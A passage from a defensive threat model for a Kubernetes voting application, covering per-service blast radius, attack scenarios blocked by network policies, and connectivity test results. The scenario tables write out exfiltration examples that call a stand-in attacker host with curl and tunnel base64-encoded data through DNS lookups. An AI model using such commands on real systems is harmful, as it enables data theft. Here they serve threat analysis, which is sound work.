| **Response** | Isolate the compromised pod. Analyse network flow logs. Determine what data was accessible. Notify affected parties per GDPR requirements. |

##### Threat 14: Session Hijacking

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Spoofing Identity |
| **Description** | An attacker steals or forges a valid JWT token to impersonate an authenticated administrator, gaining access to election management functions. |
| **Attack Vector** | Cross-site scripting (XSS) to steal tokens from the browser, man-in-the-middle interception of tokens in transit, or brute-forcing the JWT signing secret. |
| **Likelihood** | Medium |
| **Impact** | High — Admin-level access allows election manipulation, voter data access, and system configuration changes. |
| **Mitigations Implemented** | 1. JWT tokens have configurable expiration. 2. JWT signing secret is stored as a Kubernetes Secret (not in code). 3. NetworkPolicies ensure that the auth-service is the only path for token validation. 4. Audit logging records all authenticated actions, creating a trail even if a session is hijacked. |
| **Residual Risk** | Medium — Tokens are transmitted over unencrypted HTTP within the cluster. mTLS (planned) would mitigate in-transit theft. HttpOnly cookies or token binding would reduce XSS-based theft. |
| **Detection** | Audit log analysis showing actions from an admin session that don't match expected patterns. Multiple simultaneous sessions from different locations. |
| **Response** | Invalidate the compromised token. Force re-authentication. Review audit logs for actions taken during the hijacked session. Rotate JWT signing secret if compromise is at the key level. |

##### Threat 15: Privilege Escalation

| Attribute | Detail |
|---|---|
| **STRIDE Category** | Elevation of Privilege |
| **Description** | An attacker exploits a vulnerability in one microservice to gain elevated access — either within the application (e.g., voter gaining admin rights) or at the infrastructure level (e.g., gaining node access from a pod). |
| **Attack Vector** | Application-level: exploiting IDOR or broken access controls to access admin endpoints. Infrastructure-level: exploiting Kubernetes RBAC misconfigurations or container runtime vulnerabilities. |
| **Likelihood** | Medium |
| **Impact** | High to Critical — Depending on the level of escalation, could range from unauthorised data access to full cluster compromise. |
| **Mitigations Implemented** | 1. **Network-level:** Each service has strictly defined communication paths. Even with application-level privilege escalation, the compromised service can only reach its permitted network endpoints. 2. **Database-level:** Per-service database users with minimal permissions. The results_service user cannot write even if the application is compromised. 3. **Kubernetes-level:** Application pods have no RBAC permissions to modify cluster resources. ServiceAccount tokens are default (minimal). |
| **Residual Risk** | Medium — Application-level access control testing is needed to validate endpoint protection. |
| **Detection** | Unexpected API calls between services. Database queries outside the normal pattern for a service user. Kubernetes audit logs showing unexpected API requests. |
| **Response** | Isolate the affected service. Rotate credentials. Patch the vulnerability. Review all actions taken with elevated privileges via audit logs. |

---

#### 7.2.2 Internal Threats — Compromised Service Scenarios

This section analyses what an attacker can and cannot do if they fully compromise
each key service. "Fully compromise" means the attacker has arbitrary code
execution within the pod, including access to the pod's environment variables,
mounted secrets, and network identity (labels).

##### Compromised Frontend Pod (app=frontend-service)

```
  COMPROMISED FRONTEND — BLAST RADIUS
  ====================================

  CAN access:                    CANNOT access:
  ┌─────────────────────┐       ┌─────────────────────────────┐
  │ DNS (kube-system:53)│       │ PostgreSQL (:5432) — NOT in │
  │                     │       │   policy 02 whitelist       │
  └─────────────────────┘       │                             │
                                │ Audit Service (:8005) — NOT │
                                │   in policy 04 whitelist    │
                                │                             │
                                │ Other services — no egress  │
                                │   rules permit inter-service│
                                │   communication from        │
                                │   frontend                  │
                                │                             │
                                │ External internet — default │
                                │   deny blocks all egress    │
                                └─────────────────────────────┘
```

| Access Type | Permitted? | Controlled By |
|---|---|---|
| Receive traffic from ingress controller | Yes | NetworkPolicy 03 (allow-from-ingress-to-frontend) |
| DNS resolution | Yes | NetworkPolicy 01 (allow-dns) |
| Connect to PostgreSQL (:5432) | **No** | NetworkPolicy 02 does not list frontend-service |
| Connect to audit-service (:8005) | **No** | NetworkPolicy 04 does not list frontend-service |
| Connect to other services | **No** | Default-deny (NetworkPolicy 00) blocks all unlisted egress |
| Egress to external internet | **No** | Default-deny blocks all external egress |
| Read environment variables | Yes | Pod-level access (database credentials NOT mounted) |
| Read Kubernetes secrets | **No** | No RBAC permissions; secrets for DB are mounted only on backend pods |

**Assessment:** The frontend is the most constrained service in the architecture.
It is the primary attack surface (internet-facing) but has the smallest blast
radius. A compromised frontend can serve malicious content to users but cannot
access the database, audit logs, or other services. This is by design — the
frontend is intentionally isolated from all backend resources.

##### Compromised Auth Service (app=auth-service)

| Access Type | Permitted? | Controlled By |
|---|---|---|
| Receive traffic from ingress controller | Yes | NetworkPolicy 03 |
| DNS resolution | Yes | NetworkPolicy 01 |
| Connect to PostgreSQL (:5432) | **Yes** | NetworkPolicy 02 (whitelisted) |
| Connect to audit-service (:8005) | **Yes** | NetworkPolicy 04 (whitelisted) |
| Connect to other services | **No** | Default-deny |
| Egress to external internet | **No** | Default-deny |
| Database permissions | SELECT, INSERT, UPDATE on admins table | Per-service DB user (auth_service) |

**Assessment:** A compromised auth-service has access to the `admins` table,
which contains admin credentials (bcrypt-hashed). The attacker could:
- Read admin password hashes (but they are bcrypt with cost 12).
- Create new admin accounts via INSERT.
- Modify existing admin accounts via UPDATE.
- Send audit events (potentially false events to the audit trail).

The attacker **cannot**: access the votes table, elections table, voters table,
or any table outside the auth_service user's GRANT scope. The attacker cannot
reach any other service or the external internet.

##### Compromised Voting Service (app=voting-service)

| Access Type | Permitted? | Controlled By |
|---|---|---|
| Receive traffic from ingress controller | Yes | NetworkPolicy 03 |
| DNS resolution | Yes | NetworkPolicy 01 |
| Connect to PostgreSQL (:5432) | **Yes** | NetworkPolicy 02 |
| Connect to audit-service (:8005) | **Yes** | NetworkPolicy 04 |
| Connect to other services | **No** | Default-deny |
| Egress to external internet | **No** | Default-deny |
| Database permissions | INSERT on votes, SELECT on elections/candidates, UPDATE on voting_tokens | Per-service DB user (voting_service) |

**Assessment:** A compromised voting-service is one of the more sensitive
compromise scenarios because it handles the core voting operation. The attacker
could:
- Cast votes by inserting records into the votes table (but each vote is
  hash-chained, so injected votes would be visible in chain verification).
- Read election and candidate data.
- Invalidate voting tokens (UPDATE on voting_tokens).

The attacker **cannot**: modify or delete existing votes (immutability triggers
block UPDATE/DELETE on the votes table), access admin credentials, access voter
personal data (voter table is not in voting_service's GRANT scope), or
communicate with any service other than PostgreSQL and the audit-service.

##### Compromised Email Service (app=email-service)

| Access Type | Permitted? | Controlled By |
|---|---|---|
| Receive traffic from ingress controller | **No** | NetworkPolicy 03 does not list email-service |
| DNS resolution | Yes | NetworkPolicy 01 |
| Connect to PostgreSQL (:5432) | **No** | NetworkPolicy 02 does not list email-service |
| Connect to audit-service (:8005) | **Yes** | NetworkPolicy 04 (whitelisted) |
| Connect to other services | **No** | Default-deny |
| Egress to external internet (SMTP) | **No** (currently) | Default-deny; requires explicit egress policy for SMTP |
| Database permissions | None | email-service has no database user |

**Assessment:** The email-service has the second-smallest blast radius after the
frontend. It has no database access whatsoever — no credentials are even mounted.
A compromised email-service can:
- Send false audit events to the audit-service.
- Resolve DNS names (but cannot connect to the resolved services due to egress
  restrictions).

The attacker **cannot**: access the database, reach other services, exfiltrate
data to the internet, or receive any inbound traffic (it is not exposed via
ingress). The email-service is effectively isolated to audit-service
communication only.

---

### 7.3 Attack Scenarios and Response

The following multi-step attack scenarios demonstrate how the defence-in-depth
architecture responds to realistic attack chains. Each scenario shows the
attacker's perspective, the defences encountered at each step, and the final
outcome.

#### Scenario 1: SQL Injection Attempt (Frontend to Database)

```
  ATTACK FLOW: SQL INJECTION VIA FRONTEND
  ========================================

  Step 1                    Step 2                    Step 3
  ┌──────────┐             ┌──────────┐             ┌──────────┐
  │ Attacker │────HTTP────▶│ Frontend │──── X ──────▶│PostgreSQL│
  │          │  malicious  │  :3000   │  BLOCKED     │  :5432   │
  │          │  input via  │          │  by policy   │          │
  │          │  form field │          │  02 (not in  │          │
  └──────────┘             └──────────┘  whitelist)  └──────────┘
                                │
                                │ Frontend has NO database
                                │ connection string, no DB
                                │ credentials, and no network
                                │ path to port 5432.
                                │
                                ▼
                           ATTACK FAILS at network layer.
                           SQL payload never reaches database.
```

| Step | Attacker Action | System Response |
|---|---|---|
| 1 | Attacker sends crafted SQL payload via the election search form on the frontend. | Ingress controller routes request to frontend-service:3000. |
| 2 | Frontend renders the page. If it were to make a backend API call containing the input, the backend service would use parameterised queries. | Frontend processes templates; it does not construct SQL queries. |
| 3 | Even in a worst case where the frontend somehow attempted to connect to PostgreSQL directly, the connection would time out. | NetworkPolicy 02 does not include `app=frontend-service` in the ingress whitelist for PostgreSQL. The TCP SYN packet is dropped by Calico at the node level. |
| 4 | No data is returned. No error message reveals database structure. | Default-deny ensures no fallback communication path exists. |

**Defences engaged:** NetworkPolicy 02 (database ingress whitelist), NetworkPolicy 00 (default-deny egress from frontend), parameterised queries on backend services, per-service database users.

**Outcome:** Attack fails at the network layer before reaching the database. Even if the application had a vulnerability, the network architecture prevents exploitation.

---

#### Scenario 2: Lateral Movement from Compromised Frontend

```
  ATTACK FLOW: LATERAL MOVEMENT ATTEMPT
  ======================================

  Attacker compromises frontend via RCE vulnerability.
  Attempts to pivot to other services.

  ┌──────────┐
  │Compromised│
  │ Frontend  │
  │  :3000    │
  └─────┬─────┘
        │
        ├──── DNS query for "auth-service" ──────▶ SUCCEEDS (policy 01)
        │     Resolves to 10.96.x.x
        │
        ├──── TCP connect to auth-service:8001 ──▶ BLOCKED (default-deny)
        │     SYN packet dropped by Calico
        │
        ├──── TCP connect to postgresql:5432 ────▶ BLOCKED (policy 02)
        │     Frontend not in whitelist
        │
        ├──── TCP connect to audit-service:8005 ─▶ BLOCKED (policy 04)
        │     Frontend not in whitelist
        │
        ├──── HTTP to external C2 server ────────▶ BLOCKED (default-deny)
        │     No egress to internet
        │
        └──── DNS tunnelling attempt ────────────▶ LIMITED (policy 01)
              Can query DNS but responses are
              standard; CoreDNS logs anomalies
```

| Step | Attacker Action | System Response | Result |
|---|---|---|---|
| 1 | Achieves RCE in frontend pod via deserialization vulnerability. | Pod is compromised. Attacker has shell access. | Attacker in pod. |
| 2 | Runs `env` to find database credentials. | Frontend pod has no database environment variables. DB credentials are only mounted on backend service pods. | No credentials found. |
| 3 | Attempts `nslookup postgresql` to find the database. | DNS resolution succeeds (policy 01 allows DNS). | Attacker knows DB IP. |
| 4 | Attempts `nc -zv postgresql 5432`. | TCP SYN dropped by Calico. Connection times out. | Cannot reach database. |
| 5 | Attempts to connect to auth-service, voting-service, etc. | All connections blocked by default-deny. Frontend has no egress rules for inter-service communication. | No lateral movement. |
| 6 | Attempts to exfiltrate data via `curl http://attacker.com`. | Egress blocked by default-deny. No external internet access. | No exfiltration. |
| 7 | Attacker is limited to serving malicious content to users who visit the frontend. | This is the maximum impact — a defacement or phishing attack via the frontend UI. | Contained blast radius. |

**Defences engaged:** Default-deny (NetworkPolicy 00), database whitelist (NetworkPolicy 02), audit whitelist (NetworkPolicy 04), credential isolation (no DB creds on frontend pod).

**Outcome:** Attacker is contained within the frontend pod with no ability to pivot. The blast radius is limited to the frontend's own functionality.

---

#### Scenario 3: Vote Manipulation Attempt

```
  ATTACK FLOW: VOTE MANIPULATION
  ===============================

  Attacker attempts to change election results by modifying votes.

  Path 1: Via Application
  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
  │ Attacker │───▶│  Voting  │───▶│PostgreSQL│───▶│ TRIGGER  │
  │ (voter)  │    │ Service  │    │          │    │ BLOCKS   │
  │          │    │ :8003    │    │ votes    │    │ UPDATE/  │
  └──────────┘    └──────────┘    │ table    │    │ DELETE   │
                  INSERT only     └──────────┘    └──────────┘
                  via app logic

  Path 2: Via Compromised Service
  ┌──────────┐    ┌──────────┐    ┌──────────┐
  │Compromised│──▶│PostgreSQL│───▶│ TRIGGER  │
  │ Service   │   │          │    │ BLOCKS   │
  │ (any)     │   │ votes    │    │ UPDATE/  │
  └──────────┘    │ table    │    │ DELETE   │
  DB user has     └──────────┘    └──────────┘
  no UPDATE/DELETE
  on votes
```

| Step | Attacker Action | Defence Layer | Result |
|---|---|---|---|
| 1 | Attacker casts a legitimate vote, then tries to modify it via the voting-service API. | Application-layer: Voting-service has no "update vote" endpoint. | No API path to modify votes. |
| 2 | Attacker compromises voting-service and issues `UPDATE votes SET candidate_id = X`. | Database trigger: `prevent_vote_update` fires and raises an exception. | UPDATE blocked by trigger. |
| 3 | Attacker issues `DELETE FROM votes WHERE id = Y`. | Database trigger: `prevent_vote_delete` fires and raises an exception. | DELETE blocked by trigger. |
| 4 | Attacker tries to disable the trigger: `ALTER TABLE votes DISABLE TRIGGER ALL`. | Database permissions: voting_service user does not have ALTER privileges. | Permission denied. |
| 5 | Attacker inserts fraudulent votes. | Voting-service DB user can INSERT, but: (a) each vote requires a valid, unused voting token, (b) the hash chain includes the new vote, making it traceable. | Detectable via hash chain and token audit. |

**Defences engaged:** Application-layer (no update endpoint), database triggers (immutability), database user permissions (no ALTER/UPDATE/DELETE), hash-chaining (tamper evidence), audit logging (traceability).

**Outcome:** Votes cannot be modified or deleted through any application or database path available to application-level users. Fraudulent inserts are detectable via hash chain verification and voting token audit.

---

#### Scenario 4: Audit Log Tampering Attempt

| Step | Attacker Action | Defence Layer | Result |
|---|---|---|---|
| 1 | Attacker compromises a backend service and wants to erase evidence of their actions from the audit log. | First, the service must reach audit-service or database. | Depends on which service is compromised. |
| 2 | Attacker sends `DELETE` or `UPDATE` queries to the audit_logs table via PostgreSQL. | Database user for the compromised service does not have DELETE or UPDATE on audit_logs. Only audit_service has INSERT and SELECT. | Permission denied. |
| 3 | Attacker compromises the audit-service itself and tries to modify logs. | The audit_service DB user has INSERT and SELECT only — no UPDATE or DELETE. Database immutability triggers block modifications. | Permission denied / trigger blocks. |
| 4 | Attacker tries to disable triggers on audit_logs table. | audit_service DB user does not have ALTER privileges. | Permission denied. |
| 5 | Attacker inserts false audit entries to create confusion. | Hash chain on audit_logs means inserted entries must have the correct previous_hash. Any break in the chain is detectable. | Detectable via hash chain. |

**Outcome:** Audit logs cannot be modified or deleted. False entries are detectable via hash chain integrity verification. The audit trail provides non-repudiation for all logged events.

---

#### Scenario 5: Data Exfiltration Attempt

| Step | Attacker Action | Defence Layer | Result |
|---|---|---|---|
| 1 | Attacker compromises a database-connected service (e.g., admin-service) and queries voter data. | admin_service DB user has access to voters table (SELECT, INSERT, UPDATE, DELETE). | Attacker can read voter data within the pod. |
| 2 | Attacker attempts `curl http://attacker.com/exfil?data=...` to send data externally. | Default-deny (NetworkPolicy 00) blocks all external egress. | Connection times out. |
| 3 | Attacker attempts DNS tunnelling: `nslookup $(base64 data).attacker.com`. | DNS egress is restricted to kube-system:53 (NetworkPolicy 01). CoreDNS forwards the query but the response has no exfiltration channel. | Limited; detectable via DNS query logging. |
| 4 | Attacker attempts to write data to audit-service as a covert channel. | audit-service accepts structured log events on port 8005. Data would need to be embedded in audit log fields. | Possible but detectable via audit log review. |
| 5 | Attacker has data in the pod but no external network path to exfiltrate it. | The pod will eventually be restarted or replaced, and ephemeral storage is lost. | Data trapped in pod. |

**Outcome:** The default-deny egress policy is the primary control preventing data exfiltration. An attacker who compromises a service with database access can read data within the pod but has no external network path to send it out of the cluster. This is one of the strongest security properties of the architecture.

---

#### Scenario 6: Insider Threat — Compromised Backend Service via Supply Chain

| Step | Attacker Action | Defence Layer | Result |
|---|---|---|---|
| 1 | A malicious dependency is included in the election-service container image during build. The dependency includes a reverse shell that activates after deployment. | The reverse shell attempts to connect to an external C2 server. | Default-deny egress blocks the outbound connection. |
| 2 | The malicious code falls back to DNS-based C2 communication. | DNS queries to kube-system:53 succeed, but external domain resolution responses contain no usable C2 channel without outbound data paths. | C2 establishment fails. |
| 3 | The malicious code operates autonomously without C2, attempting to dump the database. | election_service DB user has SELECT, INSERT, UPDATE, DELETE on elections table. It can read election data but not votes, voters, or admin tables. | Limited data access. |
| 4 | Malicious code attempts to pivot to other services to access more data. | Default-deny blocks all inter-service communication not explicitly permitted. election-service can only reach PostgreSQL and audit-service. | No lateral movement to other services. |
| 5 | Malicious code writes exfiltrated data to audit-service, embedding it in log messages. | Audit log entries are structured and can be reviewed. Anomalous entries would be flagged during security review. | Detectable covert channel. |

**Outcome:** Even a fully compromised backend service operating with malicious code is severely constrained by the network architecture. The supply chain attack's effectiveness is limited to the data accessible through the compromised service's database permissions, and the attacker has no reliable exfiltration path.

---

## 8. Security Testing

### 8.1 Network Policy Testing

Network policy testing was conducted systematically across six phases, progressively
building the security posture and verifying enforcement at each stage. Three
purpose-built test pods were deployed in the `uvote-dev` namespace to validate
policy behaviour.

#### Test Infrastructure

| Pod Name | Image | Labels | Purpose |
|---|---|---|---|
| `test-allowed-db` | postgres:15-alpine | `app=auth-service` | Simulates a whitelisted service — should be ALLOWED database access after policy 02 |
| `test-blocked-db` | postgres:15-alpine | `app=test-blocked` | Simulates a non-whitelisted pod — should be BLOCKED from database access |
| `test-netshoot` | nicolaka/netshoot:latest | `app=test-netshoot` | Network diagnostic pod with curl, nc, nslookup, dig, tcpdump |

#### Test Commands Used

```bash
# DNS resolution test
kubectl exec -n uvote-dev test-netshoot -- nslookup postgresql.uvote-dev.svc.cluster.local

# Database connectivity test (allowed pod)
kubectl exec -n uvote-dev test-allowed-db -- pg_isready -h postgresql -p 5432

# Database connectivity test (blocked pod)
kubectl exec -n uvote-dev test-blocked-db -- pg_isready -h postgresql -p 5432

# Port connectivity test
kubectl exec -n uvote-dev test-netshoot -- nc -zv postgresql 5432 -w 3

# External connectivity test
kubectl exec -n uvote-dev test-netshoot -- curl -s --max-time 3 http://example.com
```

#### Phase-by-Phase Test Results

##### Phase 0: Baseline (No Policies)

Before any NetworkPolicies are applied, all traffic is permitted by default in
Kubernetes. This phase confirms the baseline behaviour.

| Test | Command | Expected | Actual | Status |
|---|---|---|---|---|
| DNS from netshoot | `nslookup postgresql` | Resolves | Resolved to 10.96.x.x | PASS |
| DB from allowed pod | `pg_isready -h postgresql` | Accepting connections | accepting connections | PASS |
| DB from blocked pod | `pg_isready -h postgresql` | Accepting connections | accepting connections | PASS |
| DB from netshoot | `nc -zv postgresql 5432` | Connection succeeds | Connection succeeded | PASS |
| External from netshoot | `curl http://example.com` | Returns HTML | Returned HTML | PASS |

**Observation:** All traffic flows freely. No network segmentation exists. Any
pod can reach any other pod, the database, and the external internet. This is
the state the network policies are designed to eliminate.

##### Phase 1: Default Deny (Policy 00 Applied)

After applying `00-default-deny.yaml`, ALL traffic should be blocked.

| Test | Command | Expected | Actual | Status |
|---|---|---|---|---|
| DNS from netshoot | `nslookup postgresql` | **Timeout/Fail** | ;; connection timed out | PASS |
| DB from allowed pod | `pg_isready -h postgresql` | **Timeout/Fail** | no response (timeout) | PASS |
| DB from blocked pod | `pg_isready -h postgresql` | **Timeout/Fail** | no response (timeout) | PASS |
| DB from netshoot | `nc -zv postgresql 5432 -w 3` | **Timeout/Fail** | Connection timed out | PASS |
| External from netshoot | `curl --max-time 3 http://example.com` | **Timeout/Fail** | Connection timed out | PASS |

**Observation:** Default-deny completely isolates all pods. No DNS, no database,
no external access. The zero-trust baseline is confirmed.

##### Phase 2: DNS Allow (Policy 01 Applied)

After applying `01-allow-dns.yaml` on top of default-deny, DNS should work but
all other traffic remains blocked.

| Test | Command | Expected | Actual | Status |
|---|---|---|---|---|
| DNS from netshoot | `nslookup postgresql` | **Resolves** | Resolved to 10.96.x.x | PASS |
| DNS from allowed pod | `nslookup postgresql` | **Resolves** | Resolved to 10.96.x.x | PASS |
| DNS from blocked pod | `nslookup postgresql` | **Resolves** | Resolved to 10.96.x.x | PASS |
| DB from allowed pod | `pg_isready -h postgresql` | **Timeout** | no response (timeout) | PASS |
| DB from blocked pod | `pg_isready -h postgresql` | **Timeout** | no response (timeout) | PASS |
| External from netshoot | `curl --max-time 3 http://example.com` | **Timeout** | Connection timed out | PASS |

**Observation:** DNS resolution is restored for all pods. Service names can be
resolved, but no actual connections can be made. This confirms that the DNS
policy is correctly scoped to port 53 only.

##### Phase 3: Database Allow (Policy 02 Applied)

After applying `02-allow-to-database.yaml`, only whitelisted services should
reach PostgreSQL.

| Test | Command | Expected | Actual | Status |
|---|---|---|---|---|
| DB from allowed pod (app=auth-service) | `pg_isready -h postgresql` | **Accepting connections** | accepting connections | PASS |
| DB from blocked pod (app=test-blocked) | `pg_isready -h postgresql` | **Timeout** | no response (timeout) | PASS |
| DB from netshoot (app=test-netshoot) | `nc -zv postgresql 5432 -w 3` | **Timeout** | Connection timed out | PASS |
| External from netshoot | `curl --max-time 3 http://example.com` | **Timeout** | Connection timed out | PASS |
| External from allowed pod | `curl --max-time 3 http://example.com` | **Timeout** | Connection timed out | PASS |

**Observation:** The database access policy correctly discriminates based on pod
labels. The `test-allowed-db` pod with `app=auth-service` label can reach
PostgreSQL, while `test-blocked-db` with `app=test-blocked` and `test-netshoot`
with `app=test-netshoot` are blocked. This confirms the label-based access
control model.

##### Phase 4: Ingress Allow (Policy 03 Applied)

After applying `03-allow-from-ingress.yaml`, six NetworkPolicy resources are
created (one per exposed service). Services should accept ingress traffic from
the `ingress-nginx` namespace.

| Policy Resource | Target Service | Port | Verified |
|---|---|---|---|
| allow-from-ingress-to-frontend | frontend-service | 3000 | Yes |
| allow-from-ingress-to-auth | auth-service | 8001 | Yes |
| allow-from-ingress-to-election | election-service | 8002 | Yes |
| allow-from-ingress-to-voting | voting-service | 8003 | Yes |
| allow-from-ingress-to-results | results-service | 8004 | Yes |
| allow-from-ingress-to-admin | admin-service | 8006 | Yes |

**Verification method:** Confirmed via `kubectl get networkpolicy -n uvote-dev`
that all six policies are created with the correct pod selectors and port
specifications. End-to-end verification confirmed by accessing the frontend via
the ingress URL and successfully loading the application.

**Services confirmed NOT exposed via ingress:**
- audit-service (:8005) — No ingress policy; internal-only.
- email-service (:8007) — No ingress policy; internal-only.
- postgresql (:5432) — No ingress policy; database access via policy 02 only.

##### Phase 5: Audit Allow (Policy 04 Applied)

After applying `04-allow-audit.yaml`, two NetworkPolicy resources are created
(ingress to audit-service + egress from backend services).

| Policy Resource | Direction | Targets | Port | Verified |
|---|---|---|---|---|
| allow-to-audit | Ingress | audit-service (from 6 backend services) | 8005 | Yes |
| allow-audit-egress | Egress | 6 backend services (to audit-service) | 8005 | Yes |

**Verification method:** Backend services confirmed to successfully send audit
events to audit-service:8005 via application health checks and audit log entries
appearing in the database.

#### Complete Policy Summary

After all five YAML files are applied, the total policy count is 12:

| # | Policy Name | Source File | Type | Scope |
|---|---|---|---|---|
| 1 | default-deny | 00-default-deny.yaml | Ingress + Egress | All pods |
| 2 | allow-dns | 01-allow-dns.yaml | Egress | All pods → kube-system:53 |
| 3 | allow-to-database | 02-allow-to-database.yaml | Ingress | 6 services → postgresql:5432 |
| 4 | allow-database-egress | 02-allow-to-database.yaml | Egress | 6 services → postgresql:5432 |
| 5 | allow-from-ingress-to-frontend | 03-allow-from-ingress.yaml | Ingress | ingress-nginx → frontend:3000 |
| 6 | allow-from-ingress-to-auth | 03-allow-from-ingress.yaml | Ingress | ingress-nginx → auth:8001 |
| 7 | allow-from-ingress-to-election | 03-allow-from-ingress.yaml | Ingress | ingress-nginx → election:8002 |
| 8 | allow-from-ingress-to-voting | 03-allow-from-ingress.yaml | Ingress | ingress-nginx → voting:8003 |
| 9 | allow-from-ingress-to-results | 03-allow-from-ingress.yaml | Ingress | ingress-nginx → results:8004 |
| 10 | allow-from-ingress-to-admin | 03-allow-from-ingress.yaml | Ingress | ingress-nginx → admin:8006 |
| 11 | allow-to-audit | 04-allow-audit.yaml | Ingress | 6 services → audit:8005 |
| 12 | allow-audit-egress | 04-allow-audit.yaml | Egress | 6 services → audit:8005 |

---

### 8.2 Penetration Testing (Planned)

Penetration testing is planned for the final project phase to validate the
security posture from an external attacker's perspective.

#### Scope

| Area | In Scope | Out of Scope |
|---|---|---|
| Web application | All HTTP endpoints via ingress | Direct Kubernetes API |
| Network | Pod-to-pod within uvote-dev | Cross-cluster attacks |
| Authentication | Admin login, JWT tokens | Social engineering |
| Database | SQL injection, privilege escalation | Physical access |
| Container | Image vulnerabilities, runtime | Host OS attacks |

#### Tools

| Tool | Purpose | Target |
|---|---|---|
| OWASP ZAP | Web application vulnerability scanning | All ingress-exposed endpoints |
| nmap | Port scanning and service detection | Cluster nodes, pod IPs |
| sqlmap | SQL injection testing | API endpoints with database interaction |
| kube-hunter | Kubernetes-specific vulnerability scanning | Cluster configuration |
| Trivy | Container image vulnerability scanning | All U-Vote images |

#### Planned Test Cases

| ID | Test Case | Target | Expected Result |
|---|---|---|---|
| PT-01 | Port scan all cluster nodes | Node IPs | Only ingress ports exposed |
| PT-02 | Attempt direct database connection from outside cluster | postgresql:5432 | Connection refused/timeout |
| PT-03 | SQL injection on all form fields | Frontend forms | No injection possible |
| PT-04 | JWT token forgery | auth-service | Forged tokens rejected |
| PT-05 | Session fixation | Admin login | Not exploitable |
| PT-06 | IDOR on election endpoints | election-service | Access controls enforced |
| PT-07 | Brute force admin login | auth-service via ingress | Rate limited |
| PT-08 | Attempt to access audit-service from external | audit-service:8005 | No ingress route; timeout |
| PT-09 | Attempt SSRF from frontend to internal services | frontend-service | Network policies block |
| PT-10 | Container escape via known CVEs | Application pods | Not exploitable |

---

### 8.3 Vulnerability Scanning

#### Container Image Scanning

Container image scanning is planned using Trivy to identify known vulnerabilities
in base images and application dependencies.

```bash
# Scan all U-Vote images
trivy image uvote-frontend:latest
trivy image uvote-auth-service:latest
trivy image uvote-voting-service:latest
trivy image uvote-election-service:latest
trivy image uvote-results-service:latest
trivy image uvote-audit-service:latest
trivy image uvote-admin-service:latest
trivy image uvote-email-service:latest

# Scan for HIGH and CRITICAL only
trivy image --severity HIGH,CRITICAL uvote-frontend:latest
```

**Scanning targets:**
- Base image vulnerabilities (node:alpine, python:slim, postgres:15-alpine)
- Application dependency vulnerabilities (npm packages, pip packages)
- Misconfigurations in Dockerfiles
- Embedded secrets or credentials

#### Kubernetes Configuration Scanning

| Tool | Purpose | Command |
|---|---|---|
| kube-bench | CIS Kubernetes Benchmark compliance | `kube-bench run --targets node,master` |
| kubesec | Security risk analysis of manifests | `kubesec scan deployment.yaml` |
| kube-linter | Kubernetes manifest best practices | `kube-linter lint k8s/` |
| Polaris | Best practices and security checks | `polaris audit --audit-path k8s/` |

---

### 8.4 Security Regression Testing

Security regression testing ensures that changes to the codebase or infrastructure
do not inadvertently weaken the security posture.

#### Regression Test Checklist

| Test | Frequency | Automation |
|---|---|---|
| Verify all 12 NetworkPolicies exist | Every deployment | `kubectl get netpol -n uvote-dev --no-headers \| wc -l` should return 12 |
| Verify default-deny is present | Every deployment | `kubectl get netpol default-deny -n uvote-dev` |
| Verify frontend cannot reach database | Every deployment | Deploy test pod with frontend labels, attempt DB connection |
| Verify blocked pod cannot reach database | Every deployment | Deploy test pod with unknown labels, attempt DB connection |
| Verify audit-service not exposed via ingress | Every deployment | `curl --max-time 3 http://<ingress>/api/audit` should fail |
| Verify database immutability triggers | Database migration | Attempt UPDATE on votes table, expect error |
| Verify hash chain integrity | Daily | Run hash chain verification query on votes and audit_logs |
| Container image scan | Every build | Trivy scan with --exit-code 1 for CRITICAL |

---

## 9. Compliance and Standards

### 9.1 Industry Standards Alignment

#### CIS Kubernetes Benchmark

The Center for Internet Security (CIS) Kubernetes Benchmark provides prescriptive
guidance for securing Kubernetes clusters. The following sections are most relevant
to U-Vote's network security posture.

| CIS Section | Requirement | U-Vote Status | Implementation |
|---|---|---|---|
| 5.3.1 | Ensure that the CNI in use supports NetworkPolicies | **Compliant** | Calico CNI v3.26.1 with full NetworkPolicy support |
| 5.3.2 | Ensure that all namespaces have NetworkPolicies defined | **Compliant** | uvote-dev has 12 NetworkPolicies; default-deny applies to all pods |
| 5.3.3 | Ensure that ingress is restricted to required services | **Compliant** | Policy 03 explicitly whitelists 6 services; 3 are internal-only |
| 5.3.4 | Ensure that egress is restricted | **Compliant** | Default-deny blocks all egress; only DNS, DB, and audit egress permitted |
| 5.1.1 | Ensure cluster-admin role is only used where required | **Compliant** | Application pods have no cluster-admin bindings |
| 5.1.2 | Minimize access to secrets | **Partial** | Database credentials are Kubernetes Secrets; rotation not yet automated |
| 5.1.3 | Minimize wildcard use in Roles and ClusterRoles | **Compliant** | No wildcard RBAC rules for application workloads |
| 5.1.5 | Ensure default service accounts are not actively used | **Partial** | Application pods use default SA; dedicated SAs planned |
| 5.2.1 | Minimize admission of privileged containers | **Compliant** | No privileged containers in U-Vote deployments |
| 5.2.2 | Minimize admission of containers with hostPID | **Compliant** | No hostPID in U-Vote deployments |
| 5.2.3 | Minimize admission of containers with hostNetwork | **Compliant** | No hostNetwork in U-Vote deployments (except ingress controller, which requires it) |

#### OWASP Top 10 Mapping

The OWASP Top 10 (2021) represents the most critical web application security
risks. U-Vote's security controls address each category.

| OWASP ID | Risk | U-Vote Mitigation | Network Security Relevance |
|---|---|---|---|
| A01:2021 | Broken Access Control | Per-service DB users with minimal permissions. JWT-based admin authentication. API-level authorisation checks. | NetworkPolicies enforce service-level access control at the network layer. |
| A02:2021 | Cryptographic Failures | Bcrypt password hashing (cost 12). Hash-chained votes and audit logs. TLS at ingress. | TLS termination at ingress. Internal traffic unencrypted (mTLS planned). |
| A03:2021 | Injection | Parameterised queries on all services. Frontend isolated from database by NetworkPolicy 02. | Network-level isolation prevents SQL injection from frontend reaching database. |
| A04:2021 | Insecure Design | Zero-trust architecture. Defence in depth. Threat modelling (this document). | Entire network security architecture is a design-level control. |
| A05:2021 | Security Misconfiguration | Default-deny baseline. Minimal container images. No privileged containers. | Default-deny is the network security misconfiguration prevention control. |
| A06:2021 | Vulnerable and Outdated Components | Image scanning planned (Trivy). Pinned base image versions. | NetworkPolicies limit blast radius of compromised components. |
| A07:2021 | Identification and Authentication Failures | JWT with configurable expiry. Bcrypt password storage. Audit logging of auth events. | Auth-service is the only service handling authentication, isolated by policies. |
